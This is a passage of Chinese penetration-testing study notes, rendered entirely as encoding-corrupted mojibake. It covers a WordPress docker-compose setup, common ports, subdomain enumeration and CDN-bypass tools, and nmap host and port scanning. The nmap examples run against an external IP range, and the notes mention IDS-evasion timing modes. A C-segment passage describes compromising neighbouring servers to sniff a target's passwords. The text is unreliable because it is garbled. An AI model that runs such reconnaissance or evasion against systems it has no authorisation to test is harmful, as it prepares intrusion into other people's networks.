æ³¨æ„ï¼Œä¸‹é¢è¿™ä¸ªæ–‡ä»¶å†…å®¹æ˜¯ä¸¥æ ¼è¦æ±‚æ ¼å¼çš„ï¼Œå¤šä¸€ä¸ªç©ºæ ¼éƒ½ä¸è¡Œï¼Œé€šè¿‡ç¼©è¿›æ¥è¡¨ç¤ºç­‰çº§å…³ç³»ï¼Œä¸‹é¢çš„è¿™ç§é…ç½®è¯­æ³•å«åšyamlè¯­æ³•version: 3 # docker-compose.ymlçš„æ–‡ä»¶æ ¼å¼ç‰ˆæœ¬services: db: #å®¹å™¨åç§° image: mysql:5.7 restart: always # å¼€æœºè‡ªå¯åŠ¨çš„æ„æ€ environment: MYSQL_ROOT_PASSWORD: 123456 MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: 123456 # å’Œä¸‹é¢çš„WORDPRESS_DB_PASSWORDå€¼è¦å¯¹åº”ä¸Š wordpress: depends_on: - db image: wordpress:5.6 ports: - 83:80 # ç«¯å£æ˜ å°„ restart: always environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: 123456 6-5-1 å¸¸ç”¨docker-composeå‘½ä»¤#åˆ›å»ºå¹¶å¯åŠ¨docker-compose up -d # å¯åŠ¨ä¹‹åå°±å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®äº†#åœæ­¢å¹¶åˆ é™¤docker-compose down#é‡å¯docker-compose restart#åœæ­¢docker-compose stop#å¯åŠ¨docker-compose start ä¸ƒï¼Œhttpåè®®å’ŒæŠ“åŒ…7-1 å¸¸ç”¨ç«¯å£## åº”ç”¨å±‚å¸¸è§çš„ç«¯å£å’Œå¯¹åº”ä¼ è¾“å±‚åè®®: HTTP 80 ä½¿ç”¨TCP DNS 53 ä½¿ç”¨TCPå’ŒUDP HTTPS 443 ä½¿ç”¨TCP SMB 445 ä½¿ç”¨TCP TELNET 23 ä½¿ç”¨TCP FTP 20/21 ä½¿ç”¨TCP å…«ï¼Œä¿¡æ¯æ”¶é›†8-1 åŸŸåä¿¡æ¯æ”¶é›†8-1 -1 åŸŸåä¿¡æ¯æŸ¥è¯¢https://whois.chinaz.com/ å…¶ä»–æŸ¥è¯¢ç½‘ç«™ ä¸­å›½ä¸‡ç½‘åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://whois.aliyun.com/è¥¿éƒ¨æ•°ç åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://whois.west.cn/æ–°ç½‘åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttp://whois.xinnet.com/domain/whois/index.jspçº³ç½‘åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttp://whois.nawang.cn/ä¸­èµ„æºåŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://www.zzy.cn/domain/whois.htmlä¸‰äº”äº’è”åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://cp.35.com/chinese/whois.phpæ–°ç½‘äº’è”åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttp://www.dns.com.cn/show/domain/whois/index.doç¾æ©™äº’è”åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://whois.cndns.com/çˆ±åç½‘åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://www.22.cn/domain/æ˜“åç½‘åŸŸåWHOISä¿¡æ¯æŸ¥è¯¢åœ°å€ï¼šhttps://whois.ename.net/ 8-1-2 SEOä¿¡æ¯æŸ¥è¯¢ç«™é•¿ä¹‹å®¶å¯ä»¥æŸ¥ 8-1-3 å­åŸŸåæ”¶é›†å­—å…¸çˆ†ç ´çš„æ–¹å¼ã€‚å„ç§æ‹¼æ¥å­åŸŸåç„¶åè®¿é—®æˆ–è€…pingæ¢æµ‹ã€‚ 3-1 åœ¨çº¿æ”¶é›†å­åŸŸåhttps://tool.chinaz.com/subdomain/ https://site.ip138.com/2/domain.htm https://phpinfo.me/domain/ # å±äºçˆ†ç ´å½¢å¼ 3-2 å­åŸŸåæ”¶é›†å·¥å…·2-1 JSFinder.othttps://github.com/Threezh1/JSFinder# python JSFinder.py -u https://www.mi.com# å®‰è£…requestsæ¨¡å—: pip install requests pip install bs4 2-2 Layerå­åŸŸåæŒ–æ˜æœº## https://www.webshell.cc/6384.html## 5.0æ–°ç‰ˆï¼šhttps://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg æå–ç ï¼šuk1j 2-3 subDomainsBrute.pypython .\\subDomainsBrute.py www.baigui.cloud 2-4 oneforall.pypython .\\oneforall.py --target mi.com run 3-3 å¤‡æ¡ˆå·å’Œsslè¯ä¹¦æŸ¥è¯¢å­åŸŸå3 -1 åŸŸåå¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ 3-2 ICPå¤‡æ¡ˆå·æŸ¥è¯¢https://beian.miit.gov.cn/#/Integrated/recordQuery æœ‰äº†å¤‡æ¡ˆå·ï¼Œå¯ä»¥é€šè¿‡å¤‡æ¡ˆå·æŸ¥è¯¢è¿™ä¸ªå…¬å¸çš„å…¶ä»–å¤‡æ¡ˆçš„å­åŸŸå 3-3 sslè¯ä¹¦æŸ¥è¯¢## æŸ¥è¯¢ç½‘å€: https://myssl.com/ssl.htmlhttps://www.chinassl.net/ssltools/ssl-checker.html 8-2 æ”¶é›†çœŸå®IPåœ°å€8-2-1 è¶…çº§pingç«™é•¿ä¹‹å®¶-pingæ£€æµ‹ 8-2-2 ç»ˆç«¯ping8-2-3 nslookup(windows)æ˜¯æŸ¥è¯¢DNSçš„è®°å½•ï¼ŒæŸ¥çœ‹åŸŸåè§£ææ˜¯å¦æ­£å¸¸ï¼Œåœ¨ç½‘ç»œæ•…éšœçš„æ—¶å€™ç”¨æ¥è¯Šæ–­ç½‘ç»œé—®é¢˜çš„å·¥å…·ï¼Œé€šè¿‡å®ƒä¹Ÿå¯ä»¥å°è¯•è·å–ä¸€ä¸ªåŸŸåå¯¹åº”çš„ipåœ°å€ã€‚ ## å‘½ä»¤æ ¼å¼ï¼šnslookup domain[dns-server]## ç¤ºä¾‹ï¼š nslookup wulaoban.top## è¿˜å¯ä»¥æŒ‡å®šæŸ¥è¯¢çš„DNSè®°å½•ç±»å‹å‘½ä»¤æ ¼å¼ï¼š nslookup -qt=type domain[dns-server]ç¤ºä¾‹ï¼š nslookup -qt=CNAME wulaoban.top 8-2-4 digDigæ˜¯ä¸€ä¸ªåœ¨linuxå‘½ä»¤è¡Œæ¨¡å¼ä¸‹æŸ¥è¯¢DNSåŒ…æ‹¬NSè®°å½•ï¼ŒAè®°å½•ï¼ŒMXè®°å½•ç­‰ç›¸å…³ä¿¡æ¯çš„å·¥å…·ã€‚ä¹Ÿèƒ½æ¢æµ‹åˆ°æŸä¸ªåŸŸåå¯¹åº”çš„ipåœ°å€ã€‚dig æœ€åŸºæœ¬çš„åŠŸèƒ½å°±æ˜¯æŸ¥è¯¢åŸŸåä¿¡æ¯ï¼Œå› æ­¤å®ƒçš„åç§°å®é™…ä¸Šæ˜¯â€œåŸŸåä¿¡æ¯æŸ¥è¯¢å·¥å…·Domain Information Groperâ€çš„ç¼©å†™ã€‚dig å‘ç”¨æˆ·è¿”å›çš„å†…å®¹å¯ä»¥éå¸¸è¯¦å°½ï¼Œä¹Ÿå¯ä»¥éå¸¸ç®€æ´ï¼Œå±•ç°å†…å®¹çš„å¤šå°‘å®Œå…¨ç”±ç”¨æˆ·åœ¨æŸ¥è¯¢æ—¶ä½¿ç”¨çš„é€‰é¡¹æ¥å†³å®šã€‚ dig wulaoban.top 8-2-5 cdnç»•è¿‡å·¥å…·5-1.ä½¿ç”¨å·¥å…·ç»•è¿‡ï¼Œæ•ˆæœä¸ä½³## å·¥å…·1ï¼šfuckcdnhttps://github.com/Tai7sy/fuckcdn## å·¥å…·2ï¼šw8fuckcdnhttps://github.com/boy-hack/w8fuckcdn 5-2.å†å²DNSè§£æè¿™ç§å†å²è®°å½•æŸ¥è¯¢ï¼Œæœ‰å¯èƒ½èƒ½å¤Ÿæ‰¾åˆ°å®ƒæ²¡æœ‰ä½¿ç”¨cdnä¹‹å‰çš„çœŸå®ipåœ°å€ https://x.threatbook.com/v5/domain/wulaoban.tophttps://dnsdb.io/zh-cn/ ###DNSæŸ¥è¯¢https://x.threatbook.cn/ ###å¾®æ­¥åœ¨çº¿http://toolbar.netcraft.com/site_report?url=www.wulaoban.top ###åœ¨çº¿åŸŸåä¿¡æ¯æŸ¥è¯¢http://viewdns.info/ ###DNSã€IPç­‰æŸ¥è¯¢https://tools.ipip.net/cdn.php ###CDNæŸ¥è¯¢IPhttps://securitytrails.com/domain/wulaoban.top/dns 8-3 æ—ç«™å’ŒCæ®µIPæ—ç«™ï¼šä¸€èˆ¬æ˜¯æŒ‡çš„æ˜¯åŒipï¼Œä¹Ÿå°±æ˜¯åŒæœåŠ¡å™¨ä¸‹çš„ä¸åŒç«™ç‚¹ï¼Œæ¯”å¦‚æˆ‘ä»¬å‰é¢ä½¿ç”¨IISéƒ¨ç½²äº†å¤šä¸ªç½‘ç«™åœ¨åŒä¸€ä¸ªipä¸‹ã€‚ ä»€ä¹ˆæ˜¯Cæ®µï¼šæ¯”å¦‚åœ¨ï¼š127.127.127.4 è¿™ä¸ªIPä¸Šé¢æœ‰ä¸€ä¸ªç½‘ç«™ 127.4 è¿™ä¸ªæœåŠ¡å™¨ä¸Šé¢æœ‰ç½‘ç«™æˆ‘ä»¬å¯ä»¥æƒ³æƒ³..ä»–æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„ç«™å‡ ä¹æ²¡ä»€ä¹ˆæ¼æ´ï¼ä½†æ˜¯åœ¨ä»–åŒCæ®µ 127.127.127.1127.127.127.255 è¿™ 1255 ä¸Šé¢ä¹Ÿæœ‰æœåŠ¡å™¨è€Œä¸”ä¹Ÿæœ‰ç½‘ç«™å¹¶ä¸”å­˜åœ¨æ¼æ´,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ¥æ¸—é€ 1~255ä»»ä½•ä¸€ä¸ªç«™ ä¹‹åææƒæ¥å—…æ¢å¾—åˆ°127.4 è¿™å°æœåŠ¡å™¨çš„å¯†ç  ç”šè‡³3389è¿æ¥çš„å¯†ç åå°ç™»å½•çš„å¯†ç  å¦‚æœè¿æ°”å¥½ä¼šå¾—åˆ°å¾ˆå¤šçš„å¯†ç â€¦ 8-3-1 IISPutScanner8-3-2 å¸¸ç”¨ç«¯å£ftp 21ssh\\sftp 22telnet 23 # å¾ˆå¤šäº¤æ¢æœºã€è·¯ç”±å™¨ä¼šç”¨åˆ°telnetæ¥è¿›è¡Œç®¡ç†ï¼Œä¸»è¦æ˜¯ç”¨æ¥åšè¿œç¨‹ä¸»æœºç®¡ç†çš„smtp 25 # å‘é‚®ä»¶pop3 110 # æ”¶é‚®ä»¶dns 53smb 445 # å¾®è½¯çš„æ–‡ä»¶å…±äº«ï¼Œnetstat -an -p tcp|findstr LISTENING windowså¿…å¼€ï¼Œ139ç«¯å£ä¹Ÿæ˜¯windowsåšå…±äº«çš„https 443http 80apache 80 443nginx 80 443tomcat 8080weblogic 7001mysql 3306mssql 1433oracle 1521postgresql 5432redis 6379mongdb 27017vnc 5900 # è¿œç¨‹æ§åˆ¶å·¥å…·IIS 80jboss 8080rdp == remote desktop protocol 3389 8-4 æ”¶é›†ç«¯å£å’ŒæœåŠ¡1ï¼Œnmapæ‰«æNMAPçš„åŠŸèƒ½åŒ…æ‹¬ï¼š ## ä¸»æœºå‘ç° - è¯†åˆ«ç½‘ç»œä¸Šçš„ä¸»æœºã€‚ä¾‹å¦‚ï¼Œåˆ—å‡ºå“åº”TCPå’Œ/æˆ–ICMPè¯·æ±‚æˆ–æ‰“å¼€ç‰¹å®šç«¯å£çš„ä¸»æœºã€‚## ç«¯å£æ‰«æ - æšä¸¾ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚## ç‰ˆæœ¬æ£€æµ‹ - è¯¢é—®è¿œç¨‹è®¾å¤‡ä¸Šçš„ç½‘ç»œæœåŠ¡ä»¥ç¡®å®šåº”ç”¨ç¨‹åºåç§°å’Œç‰ˆæœ¬å·ã€‚## OSæ£€æµ‹ - ç¡®å®šç½‘ç»œè®¾å¤‡çš„æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ç‰¹æ€§ã€‚## å¯ä¸è„šæœ¬è¿›è¡Œè„šæœ¬äº¤äº’ - ä½¿ç”¨Nmapè„šæœ¬å¼•æ“ï¼ˆNSEï¼‰å’ŒLuaç¼–ç¨‹è¯­è¨€ã€‚## æ¼æ´æ£€æµ‹ NMAPå¯ä»¥æä¾›æœ‰å…³ç›®æ ‡çš„æ›´å¤šä¿¡æ¯ï¼ŒåŒ…æ‹¬åå‘DNSåç§°ï¼Œè®¾å¤‡ç±»å‹å’ŒMACåœ°å€.Nmapçš„å…¸å‹ç”¨é€”ï¼š #3 é€šè¿‡è¯†åˆ«å¯ä»¥è¿›è¡Œçš„æˆ–é€šè¿‡å®ƒçš„ç½‘ç»œè¿æ¥æ¥å®¡è®¡è®¾å¤‡æˆ–é˜²ç«å¢™çš„å®‰å…¨æ€§ã€‚## è¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ä»¥å‡†å¤‡å®¡è®¡ã€‚## ç½‘ç»œåº“å­˜ï¼Œç½‘ç»œæ˜ å°„ï¼Œç»´æŠ¤å’Œèµ„äº§ç®¡ç†ã€‚## é€šè¿‡è¯†åˆ«æ–°æœåŠ¡å™¨æ¥å®¡è®¡ç½‘ç»œçš„å®‰å…¨æ€§ã€‚## ä¸ºç½‘ç»œä¸Šçš„ä¸»æœºç”Ÿæˆæµé‡ã€‚ 1 ä¸»æœºå‘ç°ä¸»æœºå‘ç°çš„åŸç†ä¸Pingå‘½ä»¤ç±»ä¼¼ï¼Œä½†æ˜¯æ‰‹æ®µä¸é™äºpingï¼Œå‘é€æ¢æµ‹åŒ…åˆ°ç›®æ ‡ä¸»æœºï¼Œå¦‚æœæ”¶åˆ°å›å¤ï¼Œé‚£ä¹ˆè¯´æ˜ç›®æ ‡ä¸»æœºæ˜¯å¼€å¯çš„ã€‚Nmapæ”¯æŒåå¤šç§ä¸åŒçš„ä¸»æœºæ¢æµ‹æ–¹å¼ï¼Œæ¯”å¦‚å‘é€ICMP çš„ECHOTIMESTAMPNETMASKæŠ¥æ–‡ã€å‘é€TCPçš„SYNACKåŒ…ã€å‘é€SCTPçš„ INITCOOKIE-ECHOåŒ…ï¼Œç”¨æˆ·å¯ä»¥åœ¨ä¸åŒçš„æ¡ä»¶ä¸‹çµæ´»é€‰ç”¨ä¸åŒçš„æ–¹å¼æ¥æ¢æµ‹ç›®æ ‡æœºã€‚ nmapè¯­æ³• Nmap æ‰«æé€‰é¡¹ æ‰«æç›®æ ‡ åŸºæœ¬ç”¨æ³• -sL: List Scan åˆ—è¡¨æ‰«æï¼Œä»…å°†æŒ‡å®šçš„ç›®æ ‡çš„IPåˆ—ä¸¾å‡ºæ¥ï¼Œä¸è¿›è¡Œä¸»æœºå‘ç°ã€‚-sn: Ping Scan åªè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æã€‚-Pn: å°†æ‰€æœ‰æŒ‡å®šçš„ä¸»æœºè§†ä½œå¼€å¯çš„ï¼Œè·³è¿‡ä¸»æœºå‘ç°çš„è¿‡ç¨‹ã€‚-PS/PA/PU/PY[portlist]: ä½¿ç”¨TCPSYN/ACKæˆ–SCTP INIT/ECHOæ–¹å¼è¿›è¡Œå‘ç°ã€‚-PE/PP/PM: ä½¿ç”¨ICMP echo, timestamp, and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœºã€‚-PO[protocollist]: ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯ã€‚-n/-R: -nè¡¨ç¤ºä¸è¿›è¡ŒDNSè§£æï¼›-Rè¡¨ç¤ºæ€»æ˜¯è¿›è¡ŒDNSè§£æã€‚--dns-servers serv1[,serv2],...: æŒ‡å®šDNSæœåŠ¡å™¨ã€‚--system-dns: æŒ‡å®šä½¿ç”¨ç³»ç»Ÿçš„DNSæœåŠ¡å™¨--traceroute: è¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹ æ¡ˆä¾‹æ¼”ç¤º nmap â€“sn 192.168.18.1-100 ## æ‰«æå±€åŸŸç½‘192.168.18.1-192.168.18.100èŒƒå›´å†…å“ªäº›IPçš„ä¸»æœºæ˜¯æ´»åŠ¨çš„ã€‚nmap â€“sn 152.136.221.1-200 ## æ‰«æå¤–ç½‘152.136.221.1-200èŒƒå›´å†…å“ªäº›ipçš„ä¸»æœºæ˜¯æ´»åŠ¨çš„nmap â€“P0 152.136.221.1-200 ## æ— pingæ‰«æ ç”±å›¾å¯çŸ¥ï¼šå¥½å¤šå°ä¸»æœºå¤„äºå­˜æ´»çŠ¶æ€ã€‚ 2ï¼Œç«¯å£æ‰«æç«¯å£æ‰«ææ˜¯Nmapæœ€åŸºæœ¬æœ€æ ¸å¿ƒçš„åŠŸèƒ½ï¼Œç”¨äºç¡®å®šç›®æ ‡ä¸»æœºçš„TCPUDPç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapä¼šæ‰«æ1000ä¸ªæœ€æœ‰å¯èƒ½å¼€æ”¾çš„TCPç«¯å£ã€‚Nmapé€šè¿‡æ¢æµ‹å°†ç«¯å£åˆ’åˆ†ä¸º6ä¸ªçŠ¶æ€ï¼š openï¼š ## ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚closedï¼š## ç«¯å£æ˜¯å…³é—­çš„ã€‚filteredï¼š## ç«¯å£è¢«é˜²ç«å¢™IDS/IPSå±è”½ï¼Œæ— æ³•ç¡®å®šå…¶çŠ¶æ€ã€‚unfilteredï¼š## ç«¯å£æ²¡æœ‰è¢«å±è”½ï¼Œä½†æ˜¯å¦å¼€æ”¾éœ€è¦è¿›ä¸€æ­¥ç¡®å®šã€‚open|filteredï¼š## ç«¯å£æ˜¯å¼€æ”¾çš„æˆ–è¢«å±è”½ã€‚closed|filtered ï¼š## ç«¯å£æ˜¯å…³é—­çš„æˆ–è¢«å±è”½ã€‚ ç«¯å£æ‰«ææ–¹é¢éå¸¸å¼ºå¤§ï¼Œæä¾›äº†å¾ˆå¤šçš„æ¢æµ‹æ–¹å¼ï¼š ## TCP SYN scanning## TCP connect scanning## TCP ACK scanning## TCP FIN/Xmas/NULL scanning## UDP scanning åˆ†ç±»] ## å¼€æ”¾æ‰«æï¼šä¼šäº§ç”Ÿå¤§é‡çš„å®¡è®¡æ•°æ®ï¼Œå®¹æ˜“è¢«å¯¹æ–¹å‘ç°ï¼Œä½†å…¶å¯é æ€§é«˜ï¼›ä¾‹å¦‚ï¼šTCP Connectç±»ã€‚ æ•ˆç‡## éšè”½æ‰«æï¼šèƒ½æœ‰æ•ˆçš„é¿å…å…¥ä¾µæ£€æµ‹ç³»ç»Ÿå’Œé˜²ç«å¢™çš„æ£€æµ‹ï¼Œä½†æ‰«æä½¿æ•°æ®åŒ…å®¹æ˜“è¢«ä¸¢å¼ƒä»è€Œäº§ç”Ÿé”™è¯¯çš„æ¢æµ‹ä¿¡æ¯ï¼›ä¾‹å¦‚ï¼šTCP FINç±»ã€‚ æ•ˆç‡ä½## åŠå¼€æ”¾æ‰«æï¼šéšè”½æ€§å’Œå¯é æ€§ä»‹äºå‰ä¸¤è€…ä¹‹é—´ã€‚ä¾‹å¦‚ï¼šTCP SYNç±»ã€‚ åŸºæœ¬ç”¨æ³• -sS/sT/sA/sW/sM: ## æŒ‡å®šä½¿ç”¨ TCP SYN/Connect()/ACK/Window/Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æã€‚-sU: ## æŒ‡å®šä½¿ç”¨UDPæ‰«ææ–¹å¼ç¡®å®šç›®æ ‡ä¸»æœºçš„UDPç«¯å£çŠ¶å†µã€‚-sN/sF/sX: ## æŒ‡å®šä½¿ç”¨TCP Null, FIN, and Xmas scansç§˜å¯†æ‰«ææ–¹å¼æ¥ååŠ©æ¢æµ‹å¯¹æ–¹çš„TCPç«¯å£çŠ¶æ€ã€‚--scanflags flags: ## å®šåˆ¶TCPåŒ…çš„flagsã€‚-sI zombiehost[:probeport]: ## æŒ‡å®šä½¿ç”¨idle scanæ–¹å¼æ¥æ‰«æç›®æ ‡ä¸»æœºï¼ˆå‰æéœ€è¦æ‰¾åˆ°åˆé€‚çš„zombie hostï¼‰-sY/sZ: ## ä½¿ç”¨SCTP INIT/COOKIE-ECHOæ¥æ‰«æSCTPåè®®ç«¯å£çš„å¼€æ”¾çš„æƒ…å†µã€‚-sO: ## ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹ã€‚-b FTP relay host: ## ä½¿ç”¨FTP bounce scanæ‰«ææ–¹å¼ å¸¸è§å‚æ•°æè¿° å…¶ä»–å‚æ•° -p port ranges ## åªæ‰«ææŒ‡å®šç«¯å£egï¼š-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9-F ## æ‰«ææ¯”é»˜è®¤æ‰«ææ›´å°‘çš„ç«¯å£--top-posts number ## æ‰«ænumberæ•°é‡çš„æœ€å¸¸è§çš„ç«¯ ä½¿ç”¨æ¼”ç¤º åœ¨æ­¤ï¼Œæˆ‘ä»¬ä»¥å±€åŸŸç½‘ä¸­çš„ä¸»æœº192.168.0.22ä¸ºä¾‹ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š nmap -sS -sU -T4 -top-ports 300 192.168.0.22 å†…ç½‘nmap -sS -sU -T4 -top-ports 300 152.136.221.160 å¤–ç½‘ å‚æ•° -sS ## è¡¨ç¤ºä½¿ç”¨TCP SYNæ–¹å¼æ‰«æTCPç«¯å£ï¼›-sU ## è¡¨ç¤ºæ‰«æUDPç«¯å£ï¼›-T4 ## è¡¨ç¤ºæ—¶é—´çº§åˆ«é…ç½®4çº§ï¼›--top-ports ## 300è¡¨ç¤ºæ‰«ææœ€æœ‰å¯èƒ½å¼€æ”¾çš„300ä¸ªç«¯å£ï¼ˆTCPå’ŒUDPåˆ†åˆ«æœ‰300ä¸ªç«¯å£ï¼‰ -Tå‚æ•°è¯´æ˜ï¼š ## -Tå‚æ•°ï¼Œä¼˜åŒ–æ—¶é—´æ§åˆ¶é€‰é¡¹çš„åŠŸèƒ½å¾ˆå¼ºå¤§ä¹Ÿå¾ˆæœ‰æ•ˆä½†æ˜¯æœ‰äº›ç”¨æˆ·ä¼šè¢«è¿·æƒ‘ã€‚æ­¤å¤–å¾€å¾€é€‰æ‹©åˆé€‚å‚æ•°çš„æ—¶é—´è¶…è¿‡äº†æ‰€éœ€ä¼˜åŒ–çš„æ‰«ææ—¶é—´ã€‚å› æ­¤Nmapæä¾›äº†ä¸€äº›ç®€å•çš„æ–¹æ³•ä½¿ç”¨6ä¸ªæ—¶é—´æ¨¡æ¿ä½¿ç”¨æ—¶é‡‡ç”¨-Té€‰é¡¹åŠæ•°å­—ï¼ˆ0~5ï¼‰æˆ–åç§°ã€‚æ¨¡æ¿åç§°æœ‰paranoid(0)ã€sneaky(1)ã€polite(2)ã€normal(3)ã€aggressive(4)ã€insane(5)## paranoidã€sneakyæ¨¡å¼ç”¨äºIDSèº²é¿ï¼ŒIDSæ˜¯å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆintrusion detection systemï¼Œç®€ç§°â€œIDSâ€ï¼‰æ˜¯ä¸€ç§å¯¹ç½‘ç»œä¼ è¾“è¿›è¡Œå³æ—¶ç›‘è§†ï¼Œåœ¨å‘ç°å¯ç–‘ä¼ è¾“æ—¶å‘å‡ºè­¦æŠ¥æˆ–è€…é‡‡å–ä¸»åŠ¨ååº”æªæ–½çš„ç½‘ç»œå®‰å…¨è®¾å¤‡## politeæ¨¡å¼é™ä½äº†æ‰«æé€Ÿåº¦åŠä½¿ç”¨æ›´å°‘çš„å¸¦å®½å’Œç›®æ ‡ä¸»æœºèµ„æº## normalä¸ºé»˜è®¤æ¨¡å¼å› æ­¤-T3å®é™…ä¸Šæœªä½œä»»ä½•ä¼˜åŒ–## aggressiveæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰åˆé€‚åŠå¯é çš„ç½‘ç»œä»è€ŒåŠ é€Ÿæ‰«æ## insaneæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰ç‰¹åˆ«å¿«çš„ç½‘ç»œæˆ–è€…æ„¿æ„ä¸ºè·å¾—é€Ÿåº¦è€Œç‰ºç‰²å‡†ç¡®æ€§ å†…ç½‘è™šæ‹Ÿæœºçš„æ•ˆæœ è¿™ä¸ªä¸»æœºå¼€æ”¾äº†5357ç«¯å£ã€‚ å¤–éƒ¨ç½‘å€æ•ˆæœ Cæ®µç«¯å£æ‰«æ nmap -p 80,443,8000,8080 -Pn 152.136.221.120/200-Pn: æŒ‡å®šipåœ°å€æ®µ æ•ˆæœï¼š ä¸ºä»€ä¹ˆè¦æ‰«æç«¯å£å‘¢ï¼Ÿå¯ä»¥æŸ¥è¯¢ç«¯å£å¯¹åº”çš„ä¸€äº›æ¼æ´è¿›è¡Œæ¸—é€ã€‚ æ‰¾åˆ°æ¼æ´åˆ—è¡¨å†å»æœç´¢å¯¹åº”çš„æ¼æ´è¯¦ç»†ä½¿ç”¨è¿‡ç¨‹ã€‚ 11ç§çŠ¶æ€ 3ï¼Œç‰ˆæœ¬ä¾¦æµ‹ç®€è¦çš„ä»‹ç»ç‰ˆæœ¬çš„ä¾¦æµ‹åŸç†ã€‚ç‰ˆæœ¬ä¾¦æµ‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ ## 1. é¦–å…ˆæ£€æŸ¥openä¸open|filteredçŠ¶æ€çš„ç«¯å£æ˜¯å¦åœ¨æ’é™¤ç«¯å£åˆ—è¡¨å†…ã€‚å¦‚æœåœ¨æ’é™¤åˆ—è¡¨ï¼Œå°†è¯¥ç«¯å£å‰”é™¤ã€‚## 2. å¦‚æœæ˜¯TCPç«¯å£ï¼Œå°è¯•å»ºç«‹TCPè¿æ¥ã€‚å°è¯•ç­‰å¾…ç‰‡åˆ»ï¼ˆé€šå¸¸6ç§’æˆ–æ›´å¤šï¼Œå…·ä½“æ—¶é—´å¯ä»¥æŸ¥è¯¢æ–‡ä»¶nmap\u0002services-probesä¸­Probe TCP NULL q||å¯¹åº”çš„totalwaitmsï¼‰ã€‚é€šå¸¸åœ¨ç­‰å¾…æ—¶é—´å†…ï¼Œä¼šæ¥æ”¶åˆ°ç›®æ ‡æœºå‘é€çš„â€œWelcomeBannerâ€ä¿¡æ¯ã€‚nmapå°†æ¥æ”¶åˆ°çš„Bannerä¸nmap-services-probesä¸­NULL probeä¸­çš„ç­¾åè¿›è¡Œå¯¹æ¯”ã€‚æŸ¥æ‰¾å¯¹åº”åº”ç”¨ç¨‹åºçš„åå­—ä¸ç‰ˆæœ¬ä¿¡æ¯ã€‚## 3. å¦‚æœé€šè¿‡â€œWelcome Bannerâ€æ— æ³•ç¡®å®šåº”ç”¨ç¨‹åºç‰ˆæœ¬ï¼Œé‚£ä¹ˆnmapå†å°è¯•å‘é€å…¶ä»–çš„æ¢æµ‹åŒ…ï¼ˆå³ä»nmap\u0002services-probesä¸­æŒ‘é€‰åˆé€‚çš„probeï¼‰ï¼Œå°†probeå¾—åˆ°å›å¤åŒ…ä¸æ•°æ®åº“ä¸­çš„ç­¾åè¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœåå¤æ¢æµ‹éƒ½æ— æ³•å¾—å‡ºå…·ä½“åº”ç”¨ï¼Œé‚£ä¹ˆæ‰“å°å‡ºåº”ç”¨è¿”å›æŠ¥æ–‡ï¼Œè®©ç”¨æˆ·è‡ªè¡Œè¿›ä¸€æ­¥åˆ¤å®šã€‚## 4. å¦‚æœæ˜¯UDPç«¯å£ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨nmap-services-probesä¸­æ¢æµ‹åŒ…è¿›è¡Œæ¢æµ‹åŒ¹é…ã€‚æ ¹æ®ç»“æœå¯¹æ¯”åˆ†æå‡ºUDPåº”ç”¨æœåŠ¡ç±»å‹ã€‚## 5. å¦‚æœæ¢æµ‹åˆ°åº”ç”¨ç¨‹åºæ˜¯SSLï¼Œé‚£ä¹ˆè°ƒç”¨openSSLè¿›ä¸€æ­¥çš„ä¾¦æŸ¥è¿è¡Œåœ¨SSLä¹‹ä¸Šçš„å…·ä½“çš„åº”ç”¨ç±»å‹ã€‚## 6. å¦‚æœæ¢æµ‹åˆ°åº”ç”¨ç¨‹åºæ˜¯SunRPCï¼Œé‚£ä¹ˆè°ƒç”¨brute-force RPC grinderè¿›ä¸€æ­¥æ¢æµ‹å…·ä½“æœåŠ¡ã€‚ åŸºæœ¬ç”¨æ³• -sV: æŒ‡å®šè®©Nmapè¿›è¡Œç‰ˆæœ¬ä¾¦æµ‹ --version-intensity level: 